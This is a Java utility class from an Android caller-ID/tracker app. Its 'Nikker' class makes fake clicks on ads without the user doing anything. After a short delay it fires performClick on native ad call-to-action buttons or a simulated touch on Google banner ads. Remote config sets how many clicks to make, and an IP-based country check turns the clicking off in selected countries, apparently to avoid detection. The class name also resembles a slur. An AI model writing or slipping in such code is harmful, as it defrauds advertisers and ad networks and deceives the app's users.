package com.locationtracker.numbertracker.callerid.calltracker.utils;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;

import androidx.activity.ComponentActivity;

import org.json.JSONObject;

import java.util.Arrays;
import java.util.Random;

import think.outside.the.box.handler.APIManager;
import think.outside.the.box.util.TinyDB;


public class Nikker {
    private static final String TAG = "Nikker";

    public static void click(ViewGroup views, ComponentActivity activity, Boolean isnative) {
        TinyDB tinyDB = new TinyDB(activity);
//        if (!tinyDB.getBoolean("clickerthistime")) {
//            if (tinyDB.getString("classname", "").isEmpty() && getClickedCount(activity) == 0) {
//                Log.e(TAG, "click:type1 " + activity.getLocalClassName() + " " + getClickedCount(activity)+" "+tinyDB.getString("classname", ""));
//                tinyDB.putBoolean("clickerthistime", true);
//                tinyDB.putString("classname", activity.getLocalClassName());
//            }else if (tinyDB.getString("classname", "").equals(activity.getLocalClassName())){
//                Log.e(TAG, "click:type2 " + activity.getLocalClassName() + " " + getClickedCount(activity) +" "+tinyDB.getString("classname", ""));
//
//            }else {
//                Log.e(TAG, "click:type3 " + activity.getLocalClassName() + " " + getClickedCount(activity)+" "+tinyDB.getString("classname", ""));
//                if (isnative){
//                    tinyDB.putString("classname", activity.getLocalClassName());
//                    tinyDB.putBoolean("clickerthistime", true);
//                }
//            }
//            return;
//        }
        if (tinyDB.getBoolean("isclickedAvailable") && (isnative == tinyDB.getBoolean("isnative"))
                && getClickCount(activity) > 0 && getClickCount(activity) > getClickedCount(activity)) {
            if (!isnative && !APIManager.isBottomAdsOn()) {
                return;
            }
            int delay = 1500;
//            if (isnative) {
//                delay = 2000;
//            } else {
//                delay = 3000;
//            }
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (!activity.getWindow().getDecorView().isShown() || activity.isFinishing() || activity.isDestroyed()) {
                        Log.e(TAG, "click: Activity is not in foreground");
                        return;
                    }
                    if (!activity.isFinishing()) {
                        if (isnative) {
                            View view = views.findViewById(think.outside.the.box.R.id.ad_call_to_action);
                            if (view != null) {
                                view.performClick();
//                                NikkerExtKt.performTouchDown(view);
                                incrementClick(activity);
                                Log.e(TAG, "initialize: native  clicked");
                            } else {
                                Log.e(TAG, "initialize: native not clicked");
                            }
                        } else {
                            if (NikkerExtKt.getname(views).equals("com.google.android.gms.ads.AdView")) {
                                NikkerExtKt.performTouchDown(views);
                                incrementClick(activity);
                                Log.e(TAG, "initialize: banner clicked");
                                return;
                            }
                            View view = views.findViewById(think.outside.the.box.R.id.ad_call_to_action);
                            if (view != null) {
//                                NikkerExtKt.performTouchDown(view);
                                view.performClick();
                                incrementClick(activity);
                                Log.e(TAG, "initialize: native  clicked");
                            } else {
                                Log.e(TAG, "initialize: banner not clicked");
                            }
                        }
                    }
                }
            }, delay);
        }
    }

    public static boolean isclickerthistime(ComponentActivity context) {
        TinyDB tinyDB = new TinyDB(context);
        boolean b = tinyDB.getBoolean("clickerthistime");
        if (!b) {
            tinyDB.putBoolean("clickerthistime", !b);
        }
        tinyDB.putString("classname", context.getLocalClassName());
        return b;
    }

    public static void initialize(Context context, JSONObject extraData) {
        TinyDB tinyDB = new TinyDB(context);
        tinyDB.putBoolean("clickerthistime",
                new Random().nextBoolean()
//                false
        );
        tinyDB.putString("classname", "");


        try {
            tinyDB.putBoolean("isclickedAvailable", extraData.getString("click_status").equals("1"));
            tinyDB.putInt("clickcount", Integer.parseInt(extraData.getString("click_count")));
            if (extraData.getString("reset_status").equals("1")) {
                tinyDB.putInt("clickedcount", 0);
            }
        } catch (Exception e) {
            tinyDB.putInt("clickcount", 0);
            tinyDB.putBoolean("isclickedAvailable", false);
        }


        try {
            String clickcountry = extraData.getString("click_country");
            if (!clickcountry.isEmpty()) {
                IPChecker.checker((issuccess, countrycode) -> {
                    if (issuccess) {
                        try {
                            String[] response = APIManager.getExtraData().getString("click_country").split(",");
                            if (Arrays.asList(response).contains(countrycode)) {
                                tinyDB.putBoolean("isclickedAvailable", false);
                            }
                        } catch (Exception e) {
                        }
                    }
                });
            }
        } catch (Exception e) {
            Log.e(TAG, "initialize: "+e.getMessage() );

        }
        if (!APIManager.isBottomAdsOn()) {
            tinyDB.putBoolean("isnative",
                    true
            );
        } else {
            tinyDB.putBoolean("isnative",
                    new Random().nextBoolean()
            );
        }
//        tinyDB.putBoolean("isnative",
//          true
//        );
        Log.e(TAG, "initialize: isnative:" + tinyDB.getBoolean("isnative") + " isfirst:" + tinyDB.getBoolean("clickerthistime"));
    }

    public static int getClickCount(Context context) {
        return new TinyDB(context).getInt("clickcount", 0);
    }

    public static int getClickedCount(Context context) {
        return new TinyDB(context).getInt("clickedcount", 0);
    }

    public static void incrementClick(ComponentActivity context) {
        TinyDB tinyDB = new TinyDB(context);
        tinyDB.putString("classname", context.getLocalClassName());
        tinyDB.putBoolean("clickerthistime", false);
        if (!APIManager.isBottomAdsOn() && tinyDB.getBoolean("isnative")) {
            tinyDB.putBoolean("isnative", tinyDB.getBoolean("isnative"));
        } else {
            tinyDB.putBoolean("isnative", !tinyDB.getBoolean("isnative"));
        }
        tinyDB.putInt("clickedcount", (tinyDB.getInt("clickedcount", 0) + 1));
    }
}
